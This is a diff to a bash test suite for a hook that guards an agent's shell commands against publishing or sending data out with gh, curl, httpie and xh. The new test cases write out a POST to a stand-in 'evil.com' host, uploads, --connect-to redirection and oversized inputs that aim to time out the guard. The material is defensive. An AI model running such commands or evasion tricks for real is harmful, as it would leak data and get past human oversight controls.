@@ -224,6 +224,10 @@ assert_eq "$OUT" "" "prose naming sudo and ssh asks nothing"
 # well past its timeout (#126). It must refuse it within half that budget.
 run_hook_within 5 "$S" "$(jsonin "$(printf 'curl -d x localhost\n%.0s' {1..1000})"$'\n''gh pr comment 1 -b x')"
 assert_rc 2 "a publish after 1,000 curl lines is refused in half the hook budget"
+# The HTTP reader keeps each word by its index, as a slice of a bash array walks the array from its start, so 30,000
+# quoted words in one write took the guard past its timeout.
+run_hook_within 5 "$S" "$(jsonin "curl -d x $(printf '"a" %.0s' {1..30000})http://localhost/; gh pr comment 1 -b x")"
+assert_rc 2 "a publish after a write of 30,000 quoted words is refused in half the hook budget"
 
 # A redirect before the command word is not the command (#109).
 run_hook "$S" "$(jsonin '> out gh pr create --fill')"
@@ -451,5 +455,42 @@ export ALLOW_PUBLISH_AS_ME=1
 run_hook "$(broken_hook shell-split.sh missing)" "$(jsonin 'gh pr view 1')"
 assert_eq "$OUT" "" "environment hatch asks nothing about a library that did not load"
 unset ALLOW_PUBLISH_AS_ME
+
+# Help as the first option after any publish verb publishes nothing (#78).
+run_hook "$S" "$(jsonin 'gh pr comment --help')"
+assert_rc 0 "help for a publish verb allowed"
+assert_eq "$OUT" "" "help for a publish verb asks nothing"
+
+# Each HTTP client's body options are read as the client reads them, and httpie's data items send a POST.
+run_hook "$S" "$(jsonin 'curl -sd x https://api.example.com/hook')"
+assert_rc 2 "a body flag at the end of a cluster blocked"
+run_hook "$S" "$(jsonin 'curl -T notes.txt https://api.example.com/upload')"
+assert_rc 2 "an upload with curl -T blocked"
+run_hook "$S" "$(jsonin 'http example.com/api text=hi')"
+assert_rc 2 "an httpie data item with no method blocked"
+run_hook "$S" "$(jsonin 'http -d https://example.com/file.tgz')"
+assert_rc 0 "an httpie download allowed"
+assert_eq "$OUT" "" "an httpie download asks nothing"
+
+# An output file or a header never names the host, so it is not read as one.
+run_hook "$S" "$(jsonin "curl -d x -H 'Authorization: Bearer ab.cd.ef' localhost:3000 -o out.json")"
+assert_rc 0 "a local write with a header and an output file allowed"
+assert_eq "$OUT" "" "a local write with a header and an output file asks nothing"
+
+# xh and httpie read http:evil.com as http://evil.com.
+run_hook "$S" "$(jsonin 'xh POST http:evil.com text=hi')"
+assert_rc 2 "a write to a URL with no slashes after its scheme blocked"
+
+# A write to a host not proven local asks, and says why.
+run_hook "$S" "$(jsonin 'curl -d x http://api:8080/x')"
+assert_rc 0 "a write to a name with no dot is not refused outright"
+assert_out '"permissionDecision":"ask"' "a write to a name with no dot asks"
+assert_out 'not proven local' "the question says the host is not proven local"
+run_hook "$S" "$(jsonin 'curl -X POST -d @msg.json "$WEBHOOK_URL"')"
+assert_out '"permissionDecision":"ask"' "a write to a URL from a variable asks"
+assert_out 'URL from a variable' "the question says the URL is from a variable"
+case "$OUT" in *'passes that argument whole'*) echo "  FAIL [a host question says nothing of a quoted argument]: $OUT"; FAILS=1 ;; esac
+run_hook "$S" "$(jsonin 'curl --connect-to ::203.0.113.5: -d x http://localhost:3000/x')"
+assert_out '"permissionDecision":"ask"' "a write that --connect-to sends elsewhere asks"
 
 finish "guard-publish"
